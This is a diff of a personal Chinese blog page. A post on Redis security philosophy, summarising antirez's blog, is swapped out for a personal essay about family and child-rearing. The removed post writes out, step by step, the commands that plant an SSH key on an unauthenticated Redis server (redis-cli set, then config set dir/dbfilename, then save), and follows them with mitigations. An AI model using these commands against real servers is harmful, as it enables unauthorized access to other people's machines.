@@ -2,17 +2,17 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>Redis的安全哲学 - 璐濒殉漂流记</title>
+  <title>闲言碎语·老人与孩 - 璐濒殉漂流记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
   
-  <meta name="description" content="最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96 里面有些东西很有意思.摘录一些观点: 为什么Redis这么多&rdquo;安全漏洞&">
+  <meta name="description" content="国庆前打车从西站回家，路遇一个炒房大叔司机，一路叨叨他们去河北买房的事情，中间有句话印象很深，是说和儿子商量怎么理财的事情：老人有老人的经验">
   <meta name="author" content="Lawulu">
-  <meta itemprop="name" content="Redis的安全哲学 - 璐濒殉漂流记">
-  <meta itemprop="description" content="最近看到Redis的作者antirez写的一篇blog: http://antirez.com/news/96 里面有些东西很有意思.摘录一些观点: 为什么Redis这么多&rdquo;安全漏洞&">
+  <meta itemprop="name" content="闲言碎语·老人与孩 - 璐濒殉漂流记">
+  <meta itemprop="description" content="国庆前打车从西站回家，路遇一个炒房大叔司机，一路叨叨他们去河北买房的事情，中间有句话印象很深，是说和儿子商量怎么理财的事情：老人有老人的经验">
   <meta itemprop="image" content="https://lawulu.github.io/img/author.jpg">
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:site" content="@inza9hi" />
-  <meta name="twitter:title" content="Redis的安全哲学 - 璐濒殉漂流记" />
+  <meta name="twitter:title" content="闲言碎语·老人与孩 - 璐濒殉漂流记" />
   
   <meta name="twitter:description" content="">
   
@@ -63,7 +63,7 @@
 	<article itemprop="articleBody">
     <header class="article-info clearfix">
   <h1 itemprop="name">
-      <a href="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/" title="Redis的安全哲学" itemprop="url">Redis的安全哲学</a>
+      <a href="https://lawulu.github.io/post/%E8%80%81%E4%BA%BA%E4%B8%8E%E5%AD%A9/" title="闲言碎语·老人与孩" itemprop="url">闲言碎语·老人与孩</a>
   </h1>
   <p class="article-author">By
     
@@ -71,7 +71,7 @@
     
   </p>
   <p class="article-time">
-    <time datetime="2016-02-15 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016年02月15日</time>
+    <time datetime="2016-10-07 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016年10月07日</time>
   </p>
 </header>
 
@@ -79,102 +79,40 @@
     
 		<div class="toc-article">
 			<strong class="toc-title">文章目录</strong>
-      <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#为什么redis这么多-安全漏洞">为什么Redis这么多&rdquo;安全漏洞&rdquo;?</a></li>
-<li><a href="#一次hack过程">一次Hack过程</a></li>
-<li><a href="#为什么不默认bind-127-0-0-1">为什么不默认bind 127.0.0.1?</a></li>
-<li><a href="#使用auth">使用Auth</a></li>
-</ul></li>
-</ul>
-</nav>
+      
 		</div>
     
-    
+    <p>国庆前打车从西站回家，路遇一个炒房大叔司机，一路叨叨他们去河北买房的事情，中间有句话印象很深，是说和儿子商量怎么理财的事情：老人有老人的经验，年轻人有年轻人的闯劲。</p>
 
-<p>最近看到Redis的作者antirez写的一篇blog: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a>
-里面有些东西很有意思.摘录一些观点:</p>
+<p>我对本地人最羡慕的一点就是，一直生活在生活的传承之下。不仅是生活的一些小窍门，还有很多为人处世的言传身教。</p>
 
-<h2 id="为什么redis这么多-安全漏洞">为什么Redis这么多&rdquo;安全漏洞&rdquo;?</h2>
+<p>这么多年没有和父母在一起生活，不管是生活理念还是人生观，因为缺少磨合和沟通，差距很大，如果按照一直以来连岳的说法，不要试图去改变他们。之前去郑州，父亲一直说我们办事情考虑问题不全面，没有把生孩子这件事给重视起来，万一某个环节出了问题，要后悔终生的。</p>
 
-<p>作者说经常收到一些Redis不安全的Report,但是大部分Report其实跟Redis没有什么关系或者说对Redis来说无关紧要.因为Redis的绝大多数用户都是将Redis放到一个安全的环境里面,而安全是一个很大的feature,Redis不会为了一小撮用户做开发这么复杂的功能.
-&gt;it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself</p>
+<p>我想起了另一件事，儿子刚出生时候，因为住院，睡成了偏头，一个耳朵有点招风，然后又折腾母乳过敏，所以招风耳这事，一直没有太重视。岳母曾经说过几次说要用胶布粘住，妻子觉得会把皮肤粘疼，也向我转述过这种想法，我下意识的把这事当成了笑话来听，说不用，招风耳就当听逆言了。直到上次因为偏头去保健科（去晚了），才听说耳朵长不回来了，只有月子里面粘住耳朵有用，才开始着急，力图让妻子赶紧淘宝买一个。因为这事，差点吵了一架。</p>
 
-<h2 id="一次hack过程">一次Hack过程</h2>
+<p>另外，母亲最近在北京看孩子，向我展示了她的耳朵，我才知道她小时候耳朵也被压了，两个耳朵不对称。同样的教训竟然发生在一个家庭两代人身上！之前因为为尊者讳的原因，我从来不知道！幸好，现在头发长了，基本看不出来。</p>
 
-<p>安全页面写到: <a href="http://redis.io/topics/security">http://redis.io/topics/security</a>
-&gt;the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running</p>
+<p>我相信网络和权威（医院），但是网络和权威并没有给一个完全性的指南。遇上问题再去搜索，肯定要晚了。</p>
 
-<p>所以,使用config命令可以往主机的Path写文件,作者展示了这一过程(为防止有些<code>script kiddies cut &amp; paste the attack</code>,没有直接提供一个脚本,并且还首先备份了当前的数据,这里省略一些无关紧要的步骤):</p>
-
-<ol>
-<li>生成一对RSA key,并且写到一个文件里面,前后加上换行符
-<code>
-$ (echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt
-</code></li>
-<li>将public key写到一个KV里面
-<code>
-cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
-</code></li>
-<li>设置工作目录
-<code>
-config set dir /Users/antirez/.ssh/
-</code></li>
-<li>将内存中数据保存到Db文件中
-<code>
-config set dbfilename &quot;authorized.keys&quot;
-save
-</code></li>
-</ol>
-
-<p>大功告成!</p>
-
-<h2 id="为什么不默认bind-127-0-0-1">为什么不默认bind 127.0.0.1?</h2>
-
-<p>事实上,如果启动时候带上默认的配置文件(redis.conf),就不存在这个安全隐患,因为配置文件里面默认是只绑定了Loopback address.既然作者知道这个安全隐患,为什么不默认启用这个配置文件呢?(就像Mysql那样).</p>
-
-<p>作者的解释是,因为RTFM（Read The Fucking Manual）</p>
-
-<h2 id="使用auth">使用Auth</h2>
-
-<p>虽然并不能真正解决安全问题..最简单有效的方法就是使用Auth.使用Auth的的几点说明:</p>
-
-<ol>
-<li>密码要尽可能的复杂,以防被brute force</li>
-<li>Auth的消耗非常少,只是在连接建立时候做一次鉴权,只有连接在,就不用再做鉴权</li>
-<li>未来可能会有ACL机制,比如某些用户并没有<code>config set dir</code>的权限</li>
-</ol>
+<p>现在父母在这里看孩子，下意识的还是觉得父母的做法有问题，不如网上随便一个论坛里面的只言片语。</p>
 
 	</div>
   <footer class="article-footer clearfix">
   
-
-<div class="article-tags">
-  <span></span>
-  
-  <a href="https://lawulu.github.io/tags/redis">redis</a>
-  
-  <a href="https://lawulu.github.io/tags/%E5%AE%89%E5%85%A8">安全</a>
-  
-</div>
-
-
 
 
 
 <div class="article-categories">
   <span></span>
   
-  <a class="article-category-link" href="https://lawulu.github.io/categories/akiross">AkiRoss</a>
+  <a class="article-category-link" href="https://lawulu.github.io/categories/aij%E4%B8%80%E6%80%9D%E8%80%83">Aij一思考</a>
   
 </div>
 
 
 
   <div class="article-share" id="share">
-    <div data-url="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/" data-title="Redis的安全哲学" data-tsina="" class="share clearfix">
+    <div data-url="https://lawulu.github.io/post/%E8%80%81%E4%BA%BA%E4%B8%8E%E5%AD%A9/" data-title="闲言碎语·老人与孩" data-tsina="" class="share clearfix">
     </div>
   </div>
 </footer>
@@ -182,8 +120,8 @@ save
 	</article>
   
 <section class="comment">
-  <div class="ds-thread" data-thread-key="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/"
-   data-title="Redis的安全哲学" data-url="https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/"></div>
+  <div class="ds-thread" data-thread-key="https://lawulu.github.io/post/%E8%80%81%E4%BA%BA%E4%B8%8E%E5%AD%A9/"
+   data-title="闲言碎语·老人与孩" data-url="https://lawulu.github.io/post/%E8%80%81%E4%BA%BA%E4%B8%8E%E5%AD%A9/"></div>
 </section>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"inza9hi"};
